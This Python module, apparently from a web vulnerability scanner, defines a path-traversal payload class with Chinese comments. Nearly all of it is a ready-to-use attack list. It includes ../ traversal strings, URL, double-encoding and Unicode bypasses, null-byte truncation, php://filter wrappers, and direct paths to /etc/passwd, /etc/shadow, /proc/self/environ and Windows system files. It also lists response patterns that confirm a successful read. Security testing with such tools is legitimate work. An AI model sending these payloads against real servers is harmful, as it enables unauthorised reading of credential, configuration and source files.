"""
路径遍历攻击载荷。

职责：生成目录遍历载荷，尝试读取服务器敏感文件
      （如 /etc/passwd、Windows 系统文件等）。
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional

from .base import Payload


class PathTraversalPayload(Payload):
    """
    路径遍历（目录遍历）攻击载荷。

    覆盖：
    - 经典 ../ 遍历
    - 编码绕过（URL / Unicode / 双编码）
    - 空字节截断
    - 绝对路径访问
    """

    @property
    def name(self) -> str:
        return "path_traversal"

    @property
    def severity(self) -> str:
        return "high"

    def generate(self, params: Optional[Dict[str, Any]] = None) -> List[str]:
        """生成路径遍历载荷列表。"""
        return [
            # 经典遍历
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",

            # 编码绕过
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..\\..\\..\\etc\\passwd",

            # Unicode 绕过
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",

            # 空字节截断
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",

            # 绝对路径
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\boot.ini",

            # PHP 封装器
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=../etc/passwd",

            # /proc 信息泄露
            "/proc/version",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
        ]

    def get_detection_patterns(self) -> List[str]:
        """路径遍历检测特征模式。"""
        return [
            "root:",
            "daemon:",
            "bin/bash",
            "bin/sh",
            "nobody:",
            "[boot loader]",
            "Microsoft TCP/IP for Windows",
            "/proc/self",
            "php://filter",
        ]
